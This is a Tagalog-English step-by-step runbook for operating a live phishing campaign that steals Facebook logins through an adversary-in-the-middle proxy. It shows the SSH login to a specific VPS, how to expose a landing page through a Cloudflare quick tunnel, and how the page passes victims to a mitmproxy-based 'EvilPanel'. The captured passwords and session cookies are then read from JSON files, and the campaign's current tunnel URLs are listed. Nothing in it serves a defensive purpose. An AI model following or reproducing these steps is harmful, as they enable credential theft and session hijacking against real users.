## Gumawa ng Landing Tunnel (Cloudflare Quick Tunnel)

### Pre-requisites
- VPS: `152.42.229.105`
- SSH Key: `~/.ssh/id_ed25519_maxphisher`
- Landing files: `/opt/landing/`
- AiTM proxy: `/opt/evilpanel/`

---

### STEP 1: SSH to VPS
```bash
ssh -i ~/.ssh/id_ed25519_maxphisher root@152.42.229.105
```

---

### STEP 2: Check kung may existing tunnels
```bash
ps aux | grep cloudflared | grep -v grep
```
Kung may existing landing tunnel (port 8080), i-kill muna:
```bash
pkill -f "cloudflared.*8080"
```

---

### STEP 3: Check kung running ang PHP server
```bash
ps aux | grep "php -S" | grep -v grep
```
Kung wala, start PHP server:
```bash
cd /opt/landing
php -S 127.0.0.1:8080 -t /opt/landing &
```

---

### STEP 4: Start Landing Tunnel
```bash
cloudflared tunnel --no-autoupdate --url http://127.0.0.1:8080 2>&1 | tee /opt/landing/cloudflared-landing.log &
```
Wait for output like:
```
https://random-words-here.trycloudflare.com
```
**Copy this URL** - ito ang Landing URL para sa campaign.

---

### STEP 5: Get Current AiTM Tunnel URL
```bash
cat /etc/environment | grep EVILPANEL
```
Output example:
```
EVILPANEL_URL=https://ultimately-ship-identifying-filename.trycloudflare.com
EVILPANEL_DOMAIN=ultimately-ship-identifying-filename.trycloudflare.com
```

---

### STEP 6: Update Landing kung bagong AiTM tunnel
Kung nagbago ang AiTM tunnel URL, i-update ang `/etc/environment`:
```bash
nano /etc/environment
```
Edit:
```
EVILPANEL_URL=https://<NEW-AITM-TUNNEL>.trycloudflare.com
EVILPANEL_DOMAIN=<NEW-AITM-TUNNEL>.trycloudflare.com
```
Then reload:
```bash
source /etc/environment
```
**Restart PHP server** para ma-apply:
```bash
pkill -f "php -S"
php -S 127.0.0.1:8080 -t /opt/landing &
```

---

### STEP 7: Test Flow
1. Open Landing URL sa browser (incognito)
2. Click "Continue with Facebook"
3. Enter email sa prompt
4. Should redirect to AiTM tunnel
5. Enter password
6. Check captures:
```bash
# Credentials
tail -5 /opt/evilpanel/data/credentials.json

# Sessions (c_user + xs)
cat /opt/evilpanel/data/sessions.json

# Mitmproxy log
tail -50 /opt/evilpanel/logs/mitmproxy.log
```

---

### Quick Reference - Current Setup
| Component | URL/Path |
|-----------|----------|
| Landing Tunnel | `https://countries-know-artist-voice.trycloudflare.com` |
| AiTM Tunnel | `https://ultimately-ship-identifying-filename.trycloudflare.com` |
| Landing Files | `/opt/landing/` |
| EvilPanel | `/opt/evilpanel/` |
| Credentials | `/opt/evilpanel/data/credentials.json` |
| Sessions | `/opt/evilpanel/data/sessions.json` |

---

### Troubleshooting
**Landing not loading:**
```bash
curl -I http://127.0.0.1:8080
```

**AiTM not working:**
```bash
curl -I https://127.0.0.1:8443 --insecure
```

**Check mitmproxy:**
```bash
ps aux | grep mitmdump
tail -f /opt/evilpanel/logs/mitmproxy.log
```